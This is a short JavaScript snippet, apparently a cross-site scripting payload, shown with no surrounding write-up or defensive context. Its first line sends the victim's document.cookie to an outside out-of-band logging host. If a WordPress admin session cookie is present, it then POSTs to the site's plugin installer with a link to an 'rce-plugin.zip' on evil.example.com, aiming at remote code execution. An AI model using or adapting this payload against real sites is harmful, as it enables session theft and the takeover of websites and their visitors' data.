// Capture cookie and send to attacker server
fetch('https://d02ck1cz1wg0000eck1ggobgjoayyyyyb.oast.pro/log?cookie=' + document.cookie);

// OPTIONAL: Auto-trigger plugin upload if admin session is detected
if (document.cookie.includes('wordpress_logged_in')) {
  fetch('https://site.fr/wp-admin/plugin-install.php', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'pluginzip=https://evil.example.com/rce-plugin.zip&_wpnonce=YOUR_NONCE_HERE'
  });
}
